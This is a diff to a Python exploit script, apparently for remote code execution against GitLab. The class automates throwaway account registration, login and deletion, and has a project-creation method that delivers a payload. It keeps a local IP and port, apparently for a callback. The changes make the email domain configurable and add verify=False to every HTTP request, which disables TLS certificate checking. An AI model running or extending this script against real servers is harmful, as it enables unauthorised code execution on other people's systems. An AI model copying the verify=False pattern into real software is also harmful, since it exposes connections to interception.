@@ -17,12 +17,13 @@ class GitlabRCE:
         self.url = gitlab_url
         self.local_ip = local_ip
         self.port = 42069
+        self.email_domain = "gmail.com"
         self.session = requests.session()
         self.username = ""
         self.password = ""
 
     def get_authenticity_token(self, url, i=-1):
-        result = self.session.get(url)
+        result = self.session.get(url, verify=False)
         parser = GitlabParse()
         token = parser.feed(result.text, i)
         return token
@@ -37,23 +38,23 @@ class GitlabRCE:
         authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in")
         self.username = self.randomize()
         self.password = self.randomize()
-        email = "{}@gmail.com".format(self.username)
+        email = "{}@{}".format(self.username, self.email_domain)
         data = {"new_user[email]": email, "new_user[email_confirmation]": email, "new_user[username]": self.username,
                 "new_user[name]": self.username, "new_user[password]": self.password,
                 "authenticity_token": authenticity_token}
-        result = self.session.post(self.url + "/users", data=data)
+        result = self.session.post(self.url + "/users", data=data, verify=False)
         print("registering {}:{} - {}".format(self.username, self.password, result.status_code))
 
     def login_user(self):
         authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in", 0)
         data = {"authenticity_token": authenticity_token, "user[login]": self.username, "user[password]": self.password}
-        result = self.session.post(self.url + "/users/sign_in", data=data)
+        result = self.session.post(self.url + "/users/sign_in", data=data, verify=False)
         print(result.status_code)
 
     def delete_user(self):
         authenticity_token = self.get_authenticity_token(self.url + "/profile/account")
         data = {"authenticity_token": authenticity_token, "_method": "delete", "password": self.password}
-        result = self.session.post(self.url + "/users", data=data)
+        result = self.session.post(self.url + "/users", data=data, verify=False)
         print("delete user {} - {}".format(self.username, result.status_code))
 
     def exploit_project_creation(self, payload):
@@ -72,7 +73,7 @@ class GitlabRCE:
                 "project[ci_cd_only]": "false", "project[name]": project,
                 "project[path]": project, "project[visibility_level]": "0",
                 "project[description]": "all your base are belong to us"}
-        result = self.session.post(self.url + "/projects", data=data)
+        result = self.session.post(self.url + "/projects", data=data, verify=False)
         print("hacking in progress - {}".format(result.status_code))
 
     def main(self):
